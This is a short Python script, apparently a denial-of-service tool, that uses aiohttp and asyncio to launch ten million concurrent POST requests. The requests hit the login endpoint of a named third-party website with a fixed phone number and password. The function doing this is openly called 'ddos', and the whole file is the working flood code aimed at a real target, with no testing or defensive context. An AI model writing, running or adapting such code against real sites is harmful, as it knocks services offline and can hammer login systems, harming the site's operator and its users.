from aiohttp import ClientSession
import random
import asyncio, uvloop
from rich import traceback
from headres import getHeaders
import json
from concurrent.futures import ThreadPoolExecutor
import sys
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

traceback.install()


CONCURRENCY_LEVEL = 10_000_000

async def ddos(url: str, payload: dict, headers: dict):

    # payload = {"mobile":"998931234567","password":"pass","equipment":1}
    

 

    async with ClientSession(base_url=url, headers=headers) as session:

        try :
            async with session.post('api/login', json=payload) as response:
                print(f"{response.status}")
        except Exception as e:
            print(f"Error: {e}")
            # print(headers)

async def main():
    url = 'https://www.engineeredarts.net/'

    payload = {"mobile":"998931234567","password":"pass","equipment":1}
    headers = await getHeaders(url)

    tasks = []
    
   

        
    for _ in range(CONCURRENCY_LEVEL):
        tasks.append(
            asyncio.create_task(ddos(url, payload, headers))
        )
        byte_size = sys.getsizeof(tasks)
        megabytes = byte_size / (1024 * 1024)
        
        print(f"Size of tasks: {byte_size} bytes / {megabytes:.4f} mb", end='\r')

    print(f"Starting {CONCURRENCY_LEVEL} concurrent requests...")
    await asyncio.gather(*tasks)
    print("All requests finished.")

    # url = 'https://www.example.com'


# print(getHeaders(url))


if __name__ == "__main__":
    asyncio.run(main())
